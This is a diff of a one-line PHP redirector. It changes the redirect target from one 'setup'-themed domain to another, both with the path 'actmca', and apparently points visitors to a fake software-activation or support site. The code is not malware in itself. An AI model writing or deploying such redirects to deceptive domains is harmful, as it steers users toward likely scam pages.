@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setupguidance.site/actmca/");
+header("Location: https://setup-online.website/actmca/");
 die();
 ?>
